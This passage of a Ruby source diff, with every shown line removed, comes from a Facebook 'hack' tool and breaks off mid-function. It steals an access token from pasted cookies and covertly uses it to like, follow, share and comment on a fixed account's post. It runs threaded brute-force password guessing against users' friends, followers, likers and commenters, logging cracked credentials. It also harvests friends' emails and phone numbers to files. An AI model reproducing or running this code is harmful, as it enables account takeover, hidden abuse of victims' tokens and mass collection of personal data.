-  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA COOKIES #{$r}[+]\n#{$r}[+] #{$g}Enter Cookies #{$r}: #{$a}")
-  cookie = gets.chomp!
-  loading!
-  uri = URI('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
-  req = Net::HTTP::Get.new(uri)
-  req["user-agent"] = $user_agent
-  req["referer"] = "https://m.facebook.com/"
-  req["host"] = "m.facebook.com"
-  req["origin"] = "https://m.facebook.com"
-  req["upgrade-insecure-requests"] = "1"
-  req["accept-language"] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-  req["cache-control"] = "max-age=0"
-  req["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
-  req["content-type"] = "text/html; charset=utf-8"
-  req["cookie"] = cookie
-  res = Net::HTTP.start(uri.hostname, uri.port,:use_ssl => true) {|http| http.request(req)}
-  $token = res.body.match(/EAAA\w+/)
-  if !$token.nil?
-    a = Net::HTTP.get(URI("https://graph.facebook.com/v10.0/me?access_token=#{$token}"))
-    b = JSON.parse(a)
-    if !b.key? ('name')
-      puts ("#{$y}[!] There is an error")
-      sleep(0.9)
-      loginco()
-    else
-      $name = b['name']
-      $id = b['id']
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁"].sample,"access_token"=>$token})  
-      File.open("login.txt", "w") { |f| f.write($token) }
-      puts ("#{$g}[✓] Login Success#{$a}")
-      sleep(0.4)
-      menu()
-    end
-  else
-    puts ("#{$y}[!] Invalid Cookies!")
-    sleep(0.9)
-    loginco()
-  end
-end
-
-def Masuk()
-  begin
-    api = URI("https://api.myip.com")
-    req = Net::HTTP.get(api)
-    res = JSON.parse(req)
-    $indonesia = true if res['country'] == "Indonesia"
-    $token = File.read("login.txt")
-    req = Request("v10.0/me?")
-    if req.key? ('name')
-      $name = req['name']
-      $id = req['id']
-      menu()
-    else
-      puts ("#{$r}[!] Invalid Access Token!#{$a}")
-      File.delete("login.txt")
-      sleep(0.9)
-      login()
-    end
-  rescue Errno::ENOENT
-    login()
-  rescue SocketError
-    abort ("#{$r}[!] No Connection#{$a}")
-  rescue Errno::ETIMEDOUT
-    abort ("#{$y}[!] Connection timed out#{$a}")
-  rescue Interrupt
-    abort ("#{$r}[!] Exit#{$a}")
-  rescue Errno::ENETUNREACH,Errno::ECONNRESET
-    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
-  end
-end
-
-def menu()
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}╔══════════════════════════════════════════════════╗")
-  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}Name : #{$g}" + $name + " "*(39 - $name.length()) + "#{$w}║")
-  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}ID.  : #{$g}" + $id + " "*(39 - $id.length()) + "#{$w}║")
-  puts ("#{$w}╠══════════════════════════════════════════════════╝")
-  puts ("║-> #{$w}1. MyFrofil")
-  puts ("║-> #{$w}2. User Information")
-  puts ("║-> #{$w}3. Hack Facebook Account")
-  puts ("║-> #{$w}4. Bot")
-  puts ("║-> #{$w}5. Others")
-  puts ("║-> #{$w}6. Feedback")
-  puts ("║-> #{$w}7. Update")
-  puts ("║-> #{$w}8. Logout")
-  puts ("║-> #{$w}0. exit")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  pilih = gets.chomp!
-  case pilih
-    when '1'
-      Myfrofil()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      menu()
-    when '2'
-      Info()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      menu()
-    when '3'
-      Hamker()
-    when '4'
-      Bot()
-    when '5'
-      lain()
-    when '6'
-      ReportBug()
-    when '7'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      code = system ('git pull')
-      if code.nil?
-        abort ("#{$y}[!] Git Not Installed\n#{$r}[!] Exit#{$a}")
-      elsif code == false
-        abort ("#{$r}[!] Error")
-      else
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        menu()
-      end
-    when '8'
-      print ("Do You Want To Continue? [Y/n] ")
-      sure = gets.chomp!
-      if sure.downcase == 'y'
-        puts ("#{$0} : Deleting File login.txt")
-        sleep(0.3)
-        begin
-          File.delete("login.txt")
-          abort ("#{$0} : Successfully Deleting the login.txt file")
-        rescue
-          puts ("#{$0} : Failed to delete the login.txt file")
-        end
-      else
-        sleep(0.2)
-        menu()
-      end
-    when '0'
-      abort ("#{$r}[!] Goodbye #{$name}#{$a}")
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      menu()
-          
-  end
-      
-end
-
-def Myfrofil()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  a = Request("v10.0/me?")
-  abort ("#{$y}[!] Error#{$a}") if a.key? ('error')
-  b = Request("me/subscribers?")
-  c = Request("me/subscribedto?")
-  d = Request("me/friends?")
-  ikuti = b['summary']['total_count'].to_s
-  mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
-  mengikuti = "0" if c['data'].empty?
-  temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
-  temen = "0" if d['data'].empty?
-  puts ("#{$g}[✓] Name : #{a['name']}")
-  puts ("#{$g}[✓] Id : #{a['id']}")
-  puts ("#{$g}[✓] Friend : #{temen}")
-  puts ("#{$g}[✓] Followers : #{ikuti}")
-  puts ("#{$g}[✓] Following : #{mengikuti}")
-  puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
-  puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
-  puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
-  a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
-  puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
-  puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
-  puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
-  puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
-  a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
-  a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
-end
-
-def Info()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] User Id : ")
-  id = gets.chomp! ; id = id.tr(" ","")
-  a = Request("#{id}?")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-  else
-    puts ("#{$w}[+] Pleace Wait")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("#{id}/subscribers?")
-    c = Request("#{id}/subscribedto?")
-    d = Request("me/friends?")
-    ikuti = b['summary']['total_count'].to_s
-    mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
-    mengikuti = "0" if c['data'].empty?
-    temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
-    temen = "0" if d['data'].empty?
-    puts ("#{$g}[✓] Name : #{a['name']}")
-    puts ("#{$g}[✓] Id : #{a['id']}")
-    puts ("#{$g}[✓] Friend : #{temen}")
-    puts ("#{$g}[✓] Followers : #{ikuti}")
-    puts ("#{$g}[✓] Following : #{mengikuti}")
-    puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
-    puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
-    puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
-    a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
-    puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
-    puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
-    puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
-    puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
-    a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
-    a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
-  end
-end
-
-def Hamker()
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("║-> #{$w}1. Mini Hack Facebook [#{$g}Target#{$w}]")
-  puts ("║-> #{$w}2. Multi Bruteforce Facebook")
-  puts ("║-> #{$w}3. Super Multi Bruteforce Facebook")
-  puts ("║-> #{$w}4. BruteForce [#{$g}Target#{$w}]")
-  puts ("║-> #{$w}5. Get id/mail/phone")
-  puts ("║-> #{$w}0. Back")
-  print("╚═#{$r}▶#{$w} ")
-  hack = gets.chomp!
-  case hack
-    when '1'
-      Mini()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Hamker()
-    when '2'
-      Multi()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Hamker()
-    when '3'
-      Super()
-    when '4'
-      Brutal()
-    when '5'
-      GetMenu()
-    when '0'
-      menu()
-    else
-      puts ("#{$y}[!] Invalid Input!")
-      sleep(0.9) ; Hamker()
-  end
-end
-
-def Mini()
-  gagal = true
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  req = Request("#{id}?")
-  if req.key? ("error")
-    puts ("#{$y}[+] User Not Found")
-  else
-    puts ("#{$w}[+] Target Name : #{req['name']}")
-    puts ("#{$w}[!] CRACK!")
-    puts ("#{$w}#{'═'*52}")
-    name = ERB::Util.url_encode(req['name'])
-    first = ERB::Util.url_encode(req['first_name'])
-    last = ERB::Util.url_encode(req['last_name'])
-    password = [name + '123', name + '321', name + '12345', name + '54321', first + '123', first + '321', first + '12345', first + '54321', last + '123', last + '321', last + '12345', last + '54321']
-    ["Sayang","Anjing","Kontol","Doraemon"].each {|i| password << i} if $indonesia
-    for pass in password
-      url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-      r = URI.open(url,'User-Agent'=>$user_agent).read()
-      res = JSON.parse(r)
-      if res.key? ('access_token')
-        puts ("#{$g}[✓] Success")
-        puts ("#{$g}[✓] Name : #{req['name']}")
-        puts ("#{$g}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
-        puts ("#{$g}[✓] username : #{id}")
-        puts ("#{$g}[✓] password : #{pass}")
-        gagal = false
-        break
-      elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
-        puts ("#{$y}[!] Account Has Been Checkpoint")
-        puts ("#{$y}[✓] Name : #{req['name']}")
-        puts ("#{$y}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
-        puts ("#{$y}[✓] username : #{id}")
-        puts ("#{$y}[✓] password : #{pass}")
-        gagal = false
-        break
-      end
-    end
-    puts ("#{$r}[!] Sorry, opening password target failed :(\n[!] Try other method.") if gagal
-  end
-end
- 
- def Multi()
-  $cp = 0
-  $ok = 0
-  th = []
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] File Id  : ")
-  files = gets.chomp!
-  if File.file? (files)
-    buka = File.readlines(files, chomp: true)
-    $file = File.open(files)
-    print ("#{$w}[+] Password : ")
-    $pwd = gets.chomp!
-    puts ("#{$w}[+] Total Id : #{buka.length}")
-    puts ("#{$w}#{'═'*52}")
-    40.times{th << Thread.new{crack!}}
-    th.each(&:join)
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Total OK : #{$ok}")
-    puts ("#{$y}[!] Total CP : #{$cp}")
-  else
-    puts ("#{$y}[!] File Not Found")
-  end
-end
-
-def crack!
-  loop do
-    begin
-      usr = $file.readline.strip
-      uri = URI("https://mbasic.facebook.com/login.php")
-      auth = {"email"=>usr,"pass"=>$pwd,"login"=>"submit"}
-      req = Net::HTTP::Post.new(uri)
-      req['user-agent'] = $user_agent
-      req.set_form_data(auth)
-      res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-      kue = res['set-cookie']
-      if kue.include? ('c_user')
-        $ok += 1
-        z = File.open("multi.txt","a")
-        z.write("#{usr} | #{$pwd}\n")
-        z.close()
-        puts ("#{$g}[OK] #{usr} | #{$pwd}")
-      elsif kue.include? ('checkpoint')
-        $cp += 1
-        z = File.open("multi.txt","a")
-        z.write("#{usr} | #{$pwd}\n")
-        z.close()
-        puts ("#{$y}[CP] #{usr} | #{$pwd}")
-      end
-    rescue SocketError
-      puts ("#{$r}[!] No Connection#{$a}")
-      sleep(1)
-    rescue Errno::ETIMEDOUT
-      puts ("#{$y}[!] Connection timed out#{$a}")
-    rescue EOFError
-      break
-    end
-  end
-end
-
-def Super()
-  $cp = 0
-  $ok = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("║-> #{$w}1. Crack from Friends")
-  puts ("║-> #{$w}2. Crack from Followers")
-  puts ("║-> #{$w}3. Crack from Like")
-  puts ("║-> #{$w}4. Crack from Comment")
-  puts ("║-> #{$w}5. Crack Friends from Friends")
-  puts ("║-> #{$w}6. Crack Followers from Friends")
-  puts ("║-> #{$w}0. Back")
-  print ("╚═#{$r}▶#{$w} ")
-  hack = gets.chomp!
-  case hack
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Pleace Wait")
-      a = Request("me/friends?fields=id,name")
-      b = a['data'].map {|i| i['id']}
-      puts ("#{$w}[+] Total Id : #{b.length}")
-      puts ("#{$w}[+] CRACK!")
-      puts ("#{$w}#{'═'*52}")
-      main(a['data'])
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Total OK : #{$ok}")
-      puts ("#{$y}[!] Total CP : #{$cp}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Super()
-    when '2'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Pleace Wait")
-      a = Request("me/subscribers?fields=id,name&limit=5000")
-      if a['data'].empty?
-        puts ("#{$y}[!] Your Account Has No Followers")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        b = a['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total Id : #{a['summary']['total_count']}")
-        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['summary']['total_count']
-        puts ("#{$w}[+] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(a['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '3'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Post Id : ")
-      id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$w}[!] Posts Not Found#{$a}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      elsif !a.key? ('likes')
-        puts ("#{$y}[!] No Likes On Posts")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        puts ("#{$w}[+] Posted by #{a['from']['name']}")
-        b = Request("#{id}/likes?summary=true&limit=5000")
-        c = b['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total Like : #{b['summary']['total_count']}")
-        puts ("#{$y}[!] Total ID that can be cracked : #{c.length}") if c.length != b['summary']['total_count']
-        puts ("#{$w}[!] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(b['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '4'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Post Id : ")
-      id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$w}[!] Posts Not Found#{$a}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      elsif !a.key? ('comments')
-        puts ("#{$y}[!] No Comments On Posts")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        puts ("#{$w}[+] Posted by #{a['from']['name']}")
-        b = Request("#{id}/comments?fields=from&summary=true&limit=5000")
-        c = b['data'].map {|i| {"id"=> i['from']['id'],"name"=> i['from']['name']}}.uniq
-        puts ("#{$w}[+] Total Id : #{c.length}")
-        puts ("#{$w}[!] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(c)
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?fields=name")
-      if a.key? ('error')
-        puts ("#{$y}[!] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        puts ("#{$w}[+] Crack From : #{a['name']}")
-        b = Request("#{id}/friends?")
-        c = b['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total id : #{c.length}")
-        puts ("#{$w}[+] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(b['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-       Super()
-      end
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      a = Request("#{id}?fields=name,subscribers.limit(5000).summary(true)")
-      if a.key? ('error')
-        puts ("#{$r}[!] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      elsif a['subscribers']['data'].empty?
-        puts ("#{$y}[!] Account Has No Followers")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        #b = a['subscribers']['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Crack From : #{a['name']}")
-        puts ("#{$w}[+] Total Followers : #{a['subscribers']['summary']['total_count']}")
-        b = a['subscribers']['data'].map {|i| i['id']}
-        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['subscribers']['summary']['total_count']
-        puts ("#{$w}[+] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(a['subscribers']['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '0'
-      Hamker()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.8)
-      Super()
-  end
-end
-
-def main(data)
-  pool = ThreadPool.new(size: 30)
-  data.each do |usr|
-    pool.schedule do
-      begin
-        name = usr['name'].split
-        if name.length == 1
-          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345']
-        else
-          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.last + '123',name.last + '12345']
-        end
-        for i in password
-          uri = URI("https://mbasic.facebook.com/login.php")
-          auth = {'email'=>usr['id'],'pass'=>i,'login'=>'submit'}
-          req = Net::HTTP::Post.new(uri)
-          req['user-agent'] = $user_agent
-          req.set_form_data(auth)
-          res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-          kue = res['set-cookie']
-          if kue.include? ('c_user')
-            $ok += 1
-            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$g}[OK] #{usr['id']} | #{i}")
-            break
-          elsif kue.include? ('checkpoint')
-            $cp += 1
-            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$y}[CP] #{usr['id']} | #{i}")
-            break
-          end
-        end
-      rescue NoMethodError then next
-      rescue SocketError
-        puts ("#{$y}[!] No Connection")
-        sleep (0.2)
-      rescue Errno::ETIMEDOUT,Net::OpenTimeout
-        puts ("#{$y}[!] Connection timed out#{$a}")
-        sleep(0.2)
-      rescue Errno::ENETUNREACH,Errno::ECONNRESET
-        puts ("#{$y}[!] Slow Internet Connection")
-        sleep(0.5)
-      end
-    end
-  end
-  pool.shutdown
-end
-      
-
-def Brutal()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$r}[+] #{$g}Id#{$w}/#{$g}email#{$w}/#{$g}Phone #{$w}(#{$g}Target#{$w}) #{$r}: ")
-  id = gets.chomp!
-  print ("#{$r}[+] #{$g}Wordlist #{$w}ext(list.txt)  #{$r}: ")
-  file = gets.chomp!
-  if File.file? (file)
-    password = File.readlines(file, chomp: true)
-    puts ("#{$r}[#{$c}✓#{$r}] #{$g}Target #{$r}: #{$w}#{id}")
-    puts ("#{$r}[+] #{$g}Total #{$c}#{password.length} #{$g}Password ")
-    puts ("#{$w}#{'═'*52}")
-    for pw in password
-      begin
-        uri = URI ("https://mbasic.facebook.com/login.php")
-        req = Net::HTTP::Post.new(uri)
-        req.set_form_data({"email"=>id,"pass"=>pw,"login"=>"submit"})
-        req['user-agent'] = $user_agent
-        puts ("#{$r}[+] #{$g}Login As #{$r}: #{$w}-> #{$g}#{id} #{$w}-> #{$g}#{pw}#{$a}")
-        log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-        res = log['set-cookie']
-        if res.include? ('c_user')
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Success")
-          puts ("#{$g}[✓] username : #{id}")
-          puts ("#{$g}[✓] password : #{pw}")
-          abort ("#{$r}[!] exit")
-        elsif res.include? ('checkpoint')
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$y}[!] Account Has Been Checkpoint")
-          puts ("#{$y}[✓] username : #{id}")
-          puts ("#{$y}[✓] password : #{pw}")
-          abort ("#{$y}[!] exit")
-        end
-      rescue SocketError
-        puts ("#{$r}[!] No Connection")
-        sleep(0.2)
-      rescue Errno::ETIMEDOUT,Net::OpenTimeout
-        puts ("#{$y}[!] Connection timed out")
-        sleep(0.5)
-      rescue Interrupt
-        puts ("\n#{$w}#{'═'*52}")
-        abort("#{$w}[+] Stopped")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$r}[!] Sorry, opening password target failed :(")
-    abort ("#{$r}[!] Try other method.")
-  else
-    puts ("#{$y}[+] File Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    Hamker()
-  end
-end
-
-def GetMenu()
-  total = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("║-> #{$w}1. Get ID From Friends")
-  puts ("║-> #{$w}2. Get Friends ID From Friends")
-  puts ("║-> #{$w}3. Get Friends Email")
-  puts ("║-> #{$w}4. Get Friends Email From Friends")
-  puts ("║-> #{$w}5. Get Phone From Friends")
-  puts ("║-> #{$w}6. Get Friend\s Phone From Friends")
-  puts ("║-> #{$w}0. Back")
-  print ("╚═#{$r}▶#{$w} ")
-  get = gets.chomp!
-  case get
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      tik ("#{$w}[+] Pleace Wait....")
-      a = Request("me/friends?")
-      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
-      print ("#{$w}[+] Save File (file.txt) : ")
-      file = gets.chomp!
-      file = "id.txt" if file == "" or file[0] == " "
-      File.open(file,'w') do |id|
-        puts ("#{$w}#{'═'*52}")
-        for i in a['data']
-          total += 1
-          id << i['id'] + "\n"
-          puts ("#{$g}[✓] Name : #{i['name']}")
-          puts ("#{$g}[✓] Id.  : #{i['id']}")
-          puts ("#{$w}#{'═'*52}")
-        end
-      end
-      puts ("#{$g}[✓] Total Id : #{total}")
-      puts ("#{$g}[✓] File : #{File.basename(file)}")
-      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      GetMenu()
-    when '2'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$y}[+] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      else
-        tik("#{$w}[+] From #{a['name']}")
-        b = Request("#{id}/friends?")
-        print ("#{$w}[+] Save File (file.txt) : ")
-        file = gets.chomp!
-        file = a['name'] + ".txt" if file == "" or file[0] == " "
-        File.open(file,'w') do |id|
-          puts ("#{$w}#{'═'*52}")
-          for i in b['data']
-            total += 1
-            id << i['id'] + "\n"
-            puts ("#{$g}[✓] Name : #{i['name']}")
-            puts ("#{$g}[✓] Id.  : #{i['id']}")
-            puts ("#{$w}#{'═'*52}")
-          end
-        end
-        puts ("#{$g}[✓] Total Id : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      end
-    when '3'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      tik ("#{$w}[+] Pleace Wait....")
-      a = Request("me/friends?")
-      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
-      print ("#{$w}[+] Save File (file.txt) : ")
-      file = gets.chomp!
-      file = "email.txt" if file == "" or file[0] == " "
-      File.open(file,"w") do |id|
-        puts ("#{$w}#{'═'*52}")
-        for i in a['data']
-          b = Request("#{i['id']}?")
-          if b.key? ('email')
-            total += 1
-            id << b['email'] + "\n"
-            puts ("#{$g}[✓] Name : #{i['name']}")
-            puts ("#{$g}[✓] email: #{b['email']}")
-            puts ("#{$w}#{'═'*52}")
-          end
-        end
-      end
-      puts ("#{$g}[✓] Total email : #{total}")
-      puts ("#{$g}[✓] File : #{File.basename(file)}")
-      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      GetMenu()
-    when '4'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$y}[+] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      else
-        tik ("#{$w}[+] From #{a['name']}")
-        b = Request("#{id}/friends?")
-        print ("#{$w}[+] Save File (file.txt) : ")
-        file = gets.chomp!
-        file = a['name'] + ".txt" if file == "" or file[0] == " "
-        File.open(file,"w") do |id|
-          puts ("#{$w}#{'═'*52}")
-          for i in b['data']
-            c = Request("#{i['id']}?")
-            if c.key? ('email')
-              total += 1
-              id << c['email'] + "\n"
-              puts ("#{$g}[✓] Name : #{i['name']}")
-              puts ("#{$g}[✓] email: #{b['email']}")
-              puts ("#{$w}#{'═'*52}")
-            end
-          end
-        end
-        puts ("#{$g}[✓] Total email : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      end
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      tik ("#{$w}[+] Pleace Wait....")
-      a = Request("me/friends?")
-      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
-      print ("#{$w}[+] Save File (file.txt) : ")
-      file = gets.chomp!
-      file = "MobilePhone.txt" if file == "" or file[0] == " "
-      File.open(file,"w") do |id|
-        puts ("#{$w}#{'═'*52}")
-        for i in a['data']
-          b = Request("#{i['id']}?")
-          if b.key? ('mobile_phone')
-            total += 1
-            id << b['mobile_phone'] + "\n"
-            puts ("#{$g}[✓] Name : #{i['name']}")
-            puts ("#{$g}[✓] phone: #{b['mobile_phone']}")
